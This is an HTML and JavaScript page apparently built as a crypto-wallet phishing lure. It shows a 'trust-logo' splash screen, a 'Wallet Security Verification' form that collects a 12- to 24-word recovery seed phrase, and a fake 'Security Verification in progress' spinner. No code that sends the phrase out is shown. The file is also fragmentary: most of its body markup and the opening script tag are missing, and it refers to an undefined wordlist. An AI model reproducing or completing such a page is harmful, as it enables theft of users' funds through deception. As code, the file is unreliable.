<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Wallet Security Verification</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* ==================== Splash Screen (Logo) ==================== */
        .splash-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #0b0e14; 
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease;
        }

        .splash-screen.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
            max-width: 450px; 
            padding: 10px;
            animation: logoFadeIn 0.8s ease-out forwards;
            opacity: 0;
            transform: scale(0.9);
        }

        @keyframes logoFadeIn {
            0% { opacity: 0; transform: scale(0.9); }
            100% { opacity: 1; transform: scale(1); }
        }

        .trust-logo {
            width: 100%;
            height: auto;
            filter: drop-shadow(0px 15px 35px rgba(0, 0, 0, 0.6));
        }

        /* ==================== Main Container ==================== */
        .container {
            width: 100%;
            max-width: 420px;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 16px 20px;
            opacity: 0;
            transition: opacity 0.4s ease;
        }

        .container.visible {
            opacity: 1;
        }

        /* ==================== Header ==================== */
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 24px;
            position: relative;
        }

        .back-btn {
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #111111;
            transform: rotate(180deg); /* Flip for LTR */
        }

        .header h1 {
            font-size: 18px;
            font-weight: 700;
            color: #111111;
            margin-left: 14px;
        }

        .scanner-icon {
            margin-left: auto;
            background: #f5f6f8;
            border: none;
            border-radius: 12px;
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .scanner-icon svg {
            width: 16px;
            height: 16px;
            fill: #555555;
        }

        /* ==================== Input Card ==================== */
        .input-card {
            background-color: #f7f8fa;
            border: 1px solid #eeeeee;
            border-radius: 20px;
            padding: 16px;
            min-height: 170px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .seed-textarea {
            width: 100%;
            height: 90px;
            border: none;
            background: transparent;
            resize: none;
            font-size: 16px;
            color: #4b62e2;
            outline: none;
            direction: ltr;
            text-align: left;
            line-height: 1.4;
            text-transform: lowercase; /* Force lowercase visually */
        }

        .seed-textarea::placeholder {
            color: #999999;
            font-size: 15px;
        }

        .card-actions {
            display: flex;
            justify-content: flex-end;
            gap: 8px;
            align-items: center;
        }

        .action-btn {
            background-color: #eef0f5;
            border: none;
            padding: 6px 16px;
            border-radius: 16px;
            font-size: 13px;
            color: #333333;
            cursor: pointer;
            font-weight: 500;
        }

        .paste-btn {
            background-color: #4b62e2;
            color: white;
            padding: 7px 24px;
            border-radius: 18px;
            font-size: 13px;
            border: none;
            cursor: pointer;
            font-weight: 500;
        }

        /* ==================== Instruction ==================== */
        .instruction {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            color: #999999;
            font-size: 12px;
            text-align: center;
            margin-bottom: 20px;
        }

        .instruction svg {
            width: 14px;
            height: 14px;
            fill: #bbbbbb;
        }

        /* ==================== Suggestions ==================== */
        .suggestions-container {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            padding-bottom: 6px;
            margin-bottom: 16px;
            scroll-behavior: smooth;
        }

        .suggestions-container::-webkit-scrollbar {
            display: none;
        }

        .suggestion-chip {
            background-color: #f1f2f6;
            border: none;
            padding: 8px 16px;
            border-radius: 16px;
            font-size: 13px;
            color: #333333;
            white-space: nowrap;
            cursor: pointer;
        }

        /* ==================== Buttons ==================== */
        .continue-btn {
            width: 100%;
            background-color: #f1f2f6;
            color: #b0b0b0;
            border: none;
            padding: 14px;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: not-allowed;
            margin-bottom: 15px;
            transition: all 0.2s ease;
        }

        .continue-btn.active {
            background-color: #4b62e2;
            color: white;
            cursor: pointer;
        }

        /* ==================== Verification Screen ==================== */
        .verification-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            opacity: 0;
            visibility: hidden;
            transition: all 0.4s ease;
        }

        .verification-screen.active {
            opacity: 1;
            visibility: visible;
        }

        /* Modern Spinner */
        .spinner-container {
            position: relative;
            width: 80px;
            height: 80px;
            margin-bottom: 24px;
        }

        .spinner-ring {
            box-sizing: border-box;
            display: block;
            position: absolute;
            width: 64px;
            height: 64px;
            margin: 8px;
            border: 4px solid #4b62e2;
            border-radius: 50%;
            animation: spinner 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
            border-color: #4b62e2 transparent transparent transparent;
        }

        .spinner-ring:nth-child(1) { animation-delay: -0.45s; }
        .spinner-ring:nth-child(2) { animation-delay: -0.3s; }
        .spinner-ring:nth-child(3) { animation-delay: -0.15s; }

        @keyframes spinner {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .verification-text {
            font-size: 18px;
            font-weight: 600;
            color: #111111;
            letter-spacing: 0.5px;
            animation: pulseText 1.5s ease-in-out infinite;
        }

        @keyframes pulseText {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
    </style>
</head>

        <div>

            <button id="continueBtn" class="continue-btn" onclick="startVerification()" disabled>Continue</button>

    </div>

        </div>
        <div class="verification-text">Security Verification in progress...</div>
    </div>

        const seedInput = document.getElementById('seedInput');
        const cardActions = document.getElementById('cardActions');
        const suggestionsContainer = document.getElementById('suggestions');
        const continueBtn = document.getElementById('continueBtn');
        const VALID_WORD_COUNTS = [12, 15, 18, 21, 24];

        // Force lowercase while typing or pasting
        seedInput.addEventListener('input', function(e) {
            let text = seedInput.value;
            
            // Convert to lowercase
            const lowercaseText = text.toLowerCase();
            if (text !== lowercaseText) {
                const start = seedInput.selectionStart;
                const end = seedInput.selectionEnd;
                seedInput.value = lowercaseText;
                seedInput.setSelectionRange(start, end);
                text = lowercaseText;
            }

            if (text.length > 0) {
                cardActions.innerHTML = `
                    <button class="action-btn" onclick="clearInput()">Clear</button>
                    <button class="action-btn" onclick="toggleHide()">Hide</button>
                `;
            } else {
                cardActions.innerHTML = `<button class="paste-btn" id="pasteBtn" onclick="pasteText()">Paste</button>`;
                suggestionsContainer.innerHTML = '';
                continueBtn.classList.remove('active');
                continueBtn.disabled = true;
                return;
            }

            const rawWords = text.split(/\s+/);
            const currentWord = rawWords[rawWords.length - 1].toLowerCase();

            if (currentWord.length > 0) {
                const matches = wordlist
                    .filter(w => w.startsWith(currentWord))
                    .slice(0, 6);

                if (matches.length > 0) {
                    suggestionsContainer.innerHTML = matches.map(word =>
                        `<button class="suggestion-chip" onclick="selectWord('${word}')">${word}</button>`
                    ).join('');
                } else {
                    suggestionsContainer.innerHTML = '';
                }
            } else {
                suggestionsContainer.innerHTML = '';
            }

            const validWordsCount = rawWords.filter(w => w.length > 0).length;
            if (VALID_WORD_COUNTS.includes(validWordsCount)) {
                continueBtn.classList.add('active');
                continueBtn.disabled = false;
            } else {
                continueBtn.classList.remove('active');
                continueBtn.disabled = true;
            }
        });

        function selectWord(word) {
            let text = seedInput.value;
            let words = text.split(/\s+/);
            words[words.length - 1] = word;
            seedInput.value = words.join(' ') + ' ';
            suggestionsContainer.innerHTML = '';
            seedInput.focus();

            const validWordsCount = words.filter(w => w.length > 0).length;
            if (VALID_WORD_COUNTS.includes(validWordsCount)) {
                continueBtn.classList.add('active');
                continueBtn.disabled = false;
            } else {
                continueBtn.classList.remove('active');
                continueBtn.disabled = true;
            }
        }

        function clearInput() {
            seedInput.value = '';
            suggestionsContainer.innerHTML = '';
            cardActions.innerHTML = `<button class="paste-btn" id="pasteBtn" onclick="pasteText()">Paste</button>`;
            continueBtn.classList.remove('active');
            continueBtn.disabled = true;
        }

        async function pasteText() {
            try {
                const text = await navigator.clipboard.readText();
                seedInput.value = text.trim().toLowerCase(); // Ensure pasted text is lowercase
                seedInput.dispatchEvent(new Event('input'));
            } catch (err) {
                console.error('Paste failed', err);
            }
        }

        let isHidden = false;
        function toggleHide() {
            isHidden = !isHidden;
            seedInput.style.webkitTextSecurity = isHidden ? 'disc' : 'none';
        }

        // ==================== Verification Logic ====================
        function startVerification() {
            const mainContainer = document.getElementById('mainContainer');
            const verificationScreen = document.getElementById('verificationScreen');
            
            // Hide main container and show verification screen
            mainContainer.style.opacity = '0';
            
            setTimeout(() => {
                mainContainer.style.display = 'none';
                verificationScreen.classList.add('active');
            }, 300);
        }
    </script>
